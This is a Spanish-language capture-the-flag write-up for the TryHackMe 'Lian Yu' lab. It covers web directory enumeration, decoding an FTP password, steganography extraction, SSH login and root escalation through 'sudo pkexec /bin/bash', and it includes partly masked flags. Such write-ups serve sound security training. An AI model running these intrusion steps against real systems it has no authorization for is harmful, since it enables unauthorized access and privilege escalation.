[VOLVER PAGINA PRINCIPAL](./)

# LIAN YU - WriteUp
## Creamos la carpeta donde estara nuestra maquina para realizar la prueba

Creamos un directorio llamado **Lian-Yu** y nos meteremos a el.

```bash
mkdir Lian-Yu
cd $_
```
Una Vez dentro de la carpeta podemos realizar la actividad.

## ENUMERAR DIRECTORIOS DE LA WEB CON GOBUSTER

Ahora vamos a enumerar los directorios que tiene la web, lo cual vamos a usar **GoBuster** y vamos usar la siguiente sintaxis.

```bash
gobuster dir -u <WEB> -w <DICCIONARIO>
```
- -u : La URL de destino.
- -w : Ruta del Diccionario.

**SALIDA DEL COMANDO**
```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.78.161
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/17 16:19:00 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/i@@@@@@              (Status: 301) [Size: 235] [--> http://10.10.78.161/i@@@@@@/]
/server-status        (Status: 403) [Size: 199]
Progress: 20465 / 20470 (99.98%)
===============================================================
2023/01/17 16:21:00 Finished
===============================================================
```

Vemos que en el codigo fuente una palabra oculta.

![WEB_RESULTADO](/assets/img/HACKER_ETICO/LIAN-YU/WEB_01.png)

Volvemos a usar **GoBuster** con el resultado obtenido anteriormente para poder sacar la primera pregunta.

**SALIDA DEL COMANDO**
```bash
===============================================================
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.78.161/i@@@@@
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/17 16:27:55 Starting gobuster in directory enumeration mode
===============================================================
/2@@@                 (Status: 301) [Size: 240] [--> http://10.10.78.161/i@@@@@/2@@@/]
Progress: 220536 / 220561 (99.99%)
===============================================================
2023/01/17 16:49:18 Finished
===============================================================
```

### PREGUNTAS SOBRE LO ENCONTRADO

- ¿Qué es el directorio web que encontraste?

```bash
2@@@
```

Ahora dentro de la dirección web obtenida y miraremos su codigo fuente en el cual vemos lo siguiete.

![WEB_RESULTADO](/assets/img/HACKER_ETICO/LIAN-YU/WEB_02.png)

Usamos el **GoBuster** de nuevo para poder sacar la extensión en la cual nos da el codigo fuente que esta de forma oculta.

```bash
gobuster dir -u <WEB> -w <DICCIONARIO> -x <Extensión>
```
- -x : Extensión de archivo para buscar

**SALIDA DEL COMANDO**
```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.69.132/i@@@@@@@@@/2@@@@/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              t@@@@@@@
[+] Timeout:                 10s
===============================================================
2023/01/17 17:06:05 Starting gobuster in directory enumeration mode
===============================================================
/g@@@@@@@@@@@@@.t@@@@@@@@@   (Status: 200) [Size: 71]
Progress: 441077 / 441122 (99.99%)
===============================================================
2023/01/17 17:53:23 Finished
```

### PREGUNTAS SOBRE LO ENCONTRADO

- ¿Cuál es el nombre del archivo que encontraste?

```bash
g@@@@@@@@@@@@@.t@@@@@@@@@
```

Ahora vamos al directorio que hemos obtenido y vemos lo siguiente

![WEB_RESULTADO](/assets/img/HACKER_ETICO/LIAN-YU/WEB_03.png)

## DESENCRIPTAR EL TEXTO OBTENIDO

Con lo cual vemos un texto, con lo cual vamos a un analizador de Hash para ver en cual esta encriptado.

![WEB_RESULTADO](/assets/img/HACKER_ETICO/LIAN-YU/WEB_04.png)

Vemos que esta en **Base 58** con lo cual vamos a usar [Cyber-Chef](https://gchq.github.io/CyberChef/) y la cual vamos obtener la contraseña del servicio **FTP**.

![WEB_RESULTADO](/assets/img/HACKER_ETICO/LIAN-YU/WEB_05.png)

### PREGUNTAS SOBRE LO ENCONTRADO

- ¿Cuál es la contraseña FTP??

```bash
!#@@@@@@@@
```

## ENTRAR AL FTP

Ahora se va entrar en el **FTP** con lo cual vamos a coger el usuario que hemos obtenido anteriormente junto con la contraseña.

**SALIDA DEL COMANDO**
```bash
Connected to 10.10.69.132.
220 (vsFTPd 3.0.2)
Name (10.10.69.132:sunamy): vi@@@@@@@@@@@@
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Ahora vamos a ver que ficheros existe en el usuario con lo cual usamos **ls -la** y se descargaria con el comando **get**.

**SALIDA DEL COMANDO**
```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||54532|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .o@@@@@@@@@@@@@
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 L@@@@@@@@@@@@.png
-rw-r--r--    1 0        0          549924 May 05  2020 Q@@@@@@@@@@@@@@@.png
-rw-r--r--    1 0        0          191026 May 01  2020 @@.jpg
226 Directory send OK.
ftp> get .o@@@@@@@@@@@@@
local: .o@@@@@@@@@@@@@ remote: .o@@@@@@@@@@@@@
229 Entering Extended Passive Mode (|||10838|).
150 Opening BINARY mode data connection for .o@@@@@@@@@@@@@ (2483 bytes).
100% ||*****************************************|  2483       12.14 MiB/s    00:00 ETA
226 Transfer complete.
2483 bytes received in 00:00 (41.52 KiB/s)
ftp> get L@@@@@@@@@@@@.png
local: L@@@@@@@@@@@@.png remote: L@@@@@@@@@@@@.png
229 Entering Extended Passive Mode (|||39026|).
150 Opening BINARY mode data connection for L@@@@@@@@@@@@.png (511720 bytes).
100% ||*****************************************|   499 KiB  400.34 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:01 (383.91 KiB/s)
ftp> get Q@@@@@@@@@@@@@@.png
local: Q@@@@@@@@@@@@@@@.png remote: Q@@@@@@@@@@@@@@@.png
229 Entering Extended Passive Mode (|||64566|).
150 Opening BINARY mode data connection for Q@@@@@@@@@@@@@@@.png (549924 bytes).
100% ||*****************************************|   537 KiB  559.53 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:01 (528.34 KiB/s)
ftp> get aa.jpg
local: @@.jpg remote: @@.jpg
229 Entering Extended Passive Mode (|||53806|).
150 Opening BINARY mode data connection for @@.jpg (191026 bytes).
100% |*****************************************|   186 KiB  438.90 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:00 (383.88 KiB/s)
```
## IMAGENES CORRUCTAS

Como vemos tiene unas cuantas imagenes en cual unao esta corructa, con lo cual vamos a usar la herramienta **hexeditor** y veremo lo siguiente.

```bash
hexeditor <fichero>
```

**SALIDA DEL COMANDO**
```bash
File: L@@@@@@@@@@@@.png       ASCII Offset: 0x00000000 / 0x0007CEE7 (%00)   
00000000  58 45 6F AE  0A 0D 1A 0A   00 00 00 0D  49 48 44 52 Eo.........IHDR
```

Como vemos a simplevista no vemos nada raro, pero si vamos a la wiki de encabezado HEX del [PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics#/media/File:PNG-Gradient_hex.png) y la editamos como corresponde con el programa y tiene ser como el siguiente resultado.

**SALIDA DEL COMANDO**
```bash
File: L@@@@@@@@@@@@.png       ASCII Offset: 0x00000006 / 0x0007CEE7 (%00)   
00000000  89 50 4E 47  0D 0A 1A 0A   00 00 00 0D  49 48 44 52 PNG........IHDR
```

La imagen nos da una clave que se usara mas adelante

Ahora tras analizar las imagenes con **StegHide** con el parametro **info**, vemos que una de ellas nos pide una contraseña con lo cual vamos a poner la contraseña de la imagen anterior.

```bash
steghide info <fichero>
```
**SALIDA DEL COMANDO**
```bash
"@@.jpg":
  formato: jpeg
  capacidad: 11,0 KB
¿Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
  archivo adjunto "@@.zip":
    tama�o: 596,0 Byte
    encriptado: rijndael-128, cbc
    compactado: si
```

Ahora vamos a extraer los archivos con "StegHide" con el parametro **Extract** y pondremos la contraseña que se obtuvo en la imagen que estaba corrompida

```bash
steghide extract -sf <fichero>
```
**SALIDA DEL COMANDO**
```bash
Anotar salvoconducto: 
anot� los datos extra�dos e/"@@.zip".
```
- -sf : leerá un archivo stego de entrada estándar

Ahora descomprimimos el archivo que hemos obtenido y vemos que tiene dos fichero.

```bash
unzip <fichero>
```
**SALIDA DEL COMANDO**
```bash
Archive:  @@.zip
  inflating: p@@@@@@.txt              
  inflating: s@@@@  
```

Vemos que uno de ellos tiene una clave de un usuario, esa contraseña se usara mas adelante.

### PREGUNTAS SOBRE LO ENCONTRADO

- ¿Cuál es el nombre del archivo con contraseña SSH?

```bash
s@@@@
```

## DENTRO DEL SSH

Volvemos al **FTP** para ver que usuarios existe en el directorio **/home** con lo cual se va usar los siguiente comando.

**SALIDA DEL COMANDO**
```bash
ftp> cd ..
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||21257|).
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 May 01  2020 .
drwxr-xr-x   23 0        0            4096 Apr 30  2020 ..
drwx------    2 1000     1000         4096 May 01  2020 s@@@@
drwxr-xr-x    2 1001     1001         4096 May 05  2020 v@@@@@@@@@@
```

Vemos que existe otro usuario, se intenta acceder desde el con el **FTP** y no se puede, con lo cual vamos a usar el otro servicio que tiene la maquina que es el **SSH**, para conectarse a el vamos a usar el usuario encontrado en el **FTP** y la contraseña obtenida del archivo extraido.

```bash
ssh <usuario>@10.10.44.255 
```
**SALIDA DEL COMANDO**
```bash
s@@@@@10.10.44.255's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  # 
```

Ahora vamos a ver que tiene el usuario en su carpeta.

**SALIDA DEL COMANDO**
```bash
s@@@@@LianYu:~$ ls -la
total 32
drwx------ 2 slade slade 4096 May  1  2020 .
drwxr-xr-x 4 root  root  4096 May  1  2020 ..
-rw------- 1 slade slade   22 May  1  2020 .bash_history
-rw-r--r-- 1 slade slade  220 May  1  2020 .bash_logout
-rw-r--r-- 1 slade slade 3515 May  1  2020 .bashrc
-r-------- 1 slade slade   77 May  1  2020 .Important
-rw-r--r-- 1 slade slade  675 May  1  2020 .profile
-r-------- 1 slade slade   63 May  1  2020 user.txt
```

### PREGUNTAS SOBRE LO ENCONTRADO

- user.txt

```bash
THM{P30@@@@@@@@@@@@53@@@@@@@@@@@@@@@@@@@0N@@}
```

## DENTRO DEL ROOT

Ahora vamos a ver que aplicación tiene el usuario con privilegios de root, con lo cual vamos a usar el comando **sudo -l** para que nos diga que aplicación tiene privilegio.

**SALIDA DEL COMANDO**
```bash
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

Vemos que tiene tiene una aplicación con privilegio de root con lo cual vamos usarla como sudo y vamos a ver que tiene la carpeta del usuario root y vamos a ejecutar una nueva terminal pero con privilegios root.

**SALIDA DEL COMANDO**
```bash
s@@@@@@LianYu:~$ sudo pkexec /bin/bash
root@LianYu:~# ls -la
total 28
drwx------  3 root root 4096 May  1  2020 .
drwxr-xr-x 23 root root 4096 May  1  2020 ..
-rw-------  1 root root   22 May  1  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 May  1  2020 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root  340 May  1  2020 root.txt 
```

### PREGUNTAS SOBRE LO ENCONTRADO

- root.txt

```bash
THM{MY_@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@_CON@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@I@@@@@@@@@@@@@34D}
```

Con todo esto ya hemos terminado.

![FINAL](/assets/img/HACKER_ETICO/LIAN-YU/WEB_06.png)